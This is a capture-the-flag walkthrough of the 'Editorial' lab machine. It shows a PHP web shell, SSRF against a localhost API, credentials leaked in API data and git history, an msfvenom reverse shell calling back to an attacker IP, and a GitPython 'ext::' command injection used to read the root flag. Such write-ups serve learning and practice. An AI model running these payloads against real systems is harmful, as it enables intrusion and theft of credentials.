@@ -1,0 +1,209 @@
+Editorial: Gitpython CVE, Exposed sensitive files, exposed credentials in file, exposed vulnerable API endpoints
+
+
+Enumeration:
+sudo nmap -sC -sV -p- --min-rate=1000 10.129.82.186
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.7 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   256 0d:ed:b2:9c:e2:53:fb:d4:c8:c1:19:6e:75:80:d8:64 (ECDSA)
+|_  256 0f:b9:a7:51:0e:00:d5:7b:5b:7c:5f:bf:2b:ed:53:a0 (ED25519)
+80/tcp open  http    nginx 1.18.0 (Ubuntu)
+|_http-title: Did not follow redirect to http://editorial.htb
+|_http-server-header: nginx/1.18.0 (Ubuntu)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+
+http://editorial.htb/
+
+echo 10.129.82.186  editorial.htb | sudo tee -a /etc/hosts
+
+This takes us to a web server where we can upload files:
+
+http://editorial.htb/upload 
+
+Let’s capture an upload request on burp suite
+
+POST /upload-cover HTTP/1.1
+Host: editorial.htb
+User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/115.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Referer: http://editorial.htb/upload
+Content-Type: multipart/form-data; boundary=---------------------------83167129815315715062422567149
+Content-Length: 345
+Origin: http://editorial.htb
+DNT: 1
+Connection: close
+Sec-GPC: 1
+
+-----------------------------83167129815315715062422567149
+Content-Disposition: form-data; name="bookurl"
+
+hello
+-----------------------------83167129815315715062422567149
+Content-Disposition: form-data; name="bookfile"; filename=""
+Content-Type: application/octet-stream
+
+
+-----------------------------83167129815315715062422567149–
+
+Response:
+
+HTTP/1.1 200 OK
+Server: nginx/1.18.0 (Ubuntu)
+Date: Tue, 16 Jul 2024 16:47:07 GMT
+Content-Type: text/html; charset=utf-8
+Connection: close
+Content-Length: 61
+
+/static/images/unsplash_photo_1630734277837_ebe62757b6e0.jpeg
+
+I created a shell.php with the content:
+<?php
+system($_GET['cmd']);
+?>
+
+I was also able to use the uploads page to upload the php file and it went through with http 200 response:
+
+Now let’s look for the shell file via directory enumeration:
+
+http://editorial.htb/uploads/shell.php?cmd=whoami 
+Output:
+Not Found
+
+The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.
+
+Going back to burp suite’s repeater:
+-----------------------------273029916018172103792849004238
+Content-Disposition: form-data; name="bookurl"
+
+http://127.0.0.1:5000/
+
+We see that when we modify the bookurl to include loopback address on port 5000, we get a different HTTP response of:
+
+Go into burp suite and go into intruder tab with the HTTP request, and modify 
+http://127.0.0.1:§5000§/ 
+
+HTTP/1.1 200 OK
+Server: nginx/1.18.0 (Ubuntu)
+Date: Tue, 16 Jul 2024 17:13:56 GMT
+Content-Type: text/html; charset=utf-8
+Connection: close
+Content-Length: 51
+
+static/uploads/da91c2ef-3514-4acc-83ea-294f03a9462b
+
+It seems the URL is handled differently when it points to a local port on the localhost
+
+http://editorial.htb/static/uploads/da91c2ef-3514-4acc-83ea-294f03a9462b 
+
+Upon going to the site, we were prompted with file installation
+
+Within the file, we use the jq command to structure the JSON information
+
+We saw multiple api endpoints like /api/latest/metadata, /api/latest/metadata/messages/coupons, etc.
+
+Given this api endpoint, we got another file download:
+/api/latest/metadata/messages/authors  
+
+"template_mail_message": "Welcome to the team! We are thrilled to have you on board and can't wait to see the incredible content you'll bring to the table.\n\nYour login credentials for our internal forum and authors site are:\nUsername: dev\nPassword: dev080217_devAPI!@\nPlease be sure to change your password as soon as possible for security purposes.\n\nDon't hesitate to reach out if you have any questions or ideas - we're always here to support you.\n\nBest regards, Editorial Tiempo Arriba Team."                                                            
+}
+
+We now have initial foothold into system:
+
+dev@editorial:~$ cat user.txt
+98e7ac6fbd5de34975474f306550b706
+
+Privilege escalation:
+dev@editorial:~$ sudo -l
+[sudo] password for dev: 
+Sorry, user dev may not run sudo on editorial.
+
+ dev@editorial:~$ sudo /bin/bash
+[sudo] password for dev: 
+Sorry, try again.
+[sudo] password for dev: 
+dev is not in the sudoers file.  This incident will be reported.
+
+dev@editorial:~$ cd apps
+dev@editorial:~/apps$ ls -al
+total 12
+drwxrwxr-x 3 dev dev 4096 Jun  5 14:36 .
+drwxr-x--- 4 dev dev 4096 Jun  5 14:36 ..
+drwxr-xr-x 8 dev dev 4096 Jun  5 14:36 .git
+
+We use the git command to “git show” any commits
+
+ev@editorial:~/apps$ git show
+commit 8ad0f3187e2bda88bba85074635ea942974587e8 (HEAD -> master)
+Author: dev-carlos.valderrama <dev-carlos.valderrama@tiempoarriba.htb>
+Date:   Sun Apr 30 21:04:21 2023 -0500
+
+
+git log - shows all commits
+git show {commit_#} - used to see commits
+
+git show b73481bb823d2dfb49c44f4c1e6a7e11912ed8ae
+
+-        'template_mail_message': "Welcome to the team! We are thrilled to have you on board and can't wait to see the incredible content you'll bring to the table.\n\nYour login credentials for our internal forum and authors site are:\nUsername: prod\nPassword: 080217_Producti0n_2023!@\nPlease be sure to change your password as soon as possible for security purposes.\n\nDon't hesitate to reach out if you have any questions or ideas - we're always here to support you.\n\nBest regards, " + api_editorial_name + " Team."
+
+
+Let’s SSH into prod@10.129.82.186
+
+prod@editorial:~$ sudo -l
+[sudo] password for prod: 
+Matching Defaults entries for prod on editorial:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
+    use_pty
+
+User prod may run the following commands on editorial:
+    (root) /usr/bin/python3
+        /opt/internal_apps/clone_changes/clone_prod_change.py *
+
+This shows we can run python3 as a root user:
+
+prod@editorial:~$ sudo /usr/bin/python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'
+Sorry, user prod is not allowed to execute '/usr/bin/python3 -c import os; os.setuid(0); os.system("/bin/sh")' as root on editorial.
+
+Let’s try to use the clone_prod_change.py script
+
+prod@editorial:/opt/internal_apps/clone_changes$ cat clone_prod_change.py 
+#!/usr/bin/python3
+
+import os
+import sys
+from git import Repo
+
+os.chdir('/opt/internal_apps/clone_changes')
+
+url_to_clone = sys.argv[1]
+
+r = Repo.init('', bare=True)
+r.clone_from(url_to_clone, 'new_changes', multi_options=["-c protocol.ext.allow=always"])
+
+On attack machine, let’s try the post exploitation recon:
+msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.14.206 LPORT=4444 -f elf -o reverse.elf
+python3  -m http.server 7001
+msfconsole
+
+Now we have our reverse shell in via /tmp folder of Linux prod user
+
+We are now running post/multi/recon/local_exploit_suggester
+
+ 1   exploit/linux/local/cve_2022_0847_dirtypipe                        Yes                      The target appears to be vulnerable. Linux kernel version found: 5.15.0
+ 2   exploit/linux/local/su_login                                       Yes                      The target appears to be vulnerable.
+
+
+https://github.com/gitpython-developers/GitPython/issues/1515 
+
+sudo /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py 'ext::sh -c cat% /root/root.txt% >% /tmp/root' 
+
+prod@editorial:/tmp$ cat root
+218301664efe429c9d7c7a4b5f497d93
+
+
+Now we got the root flag
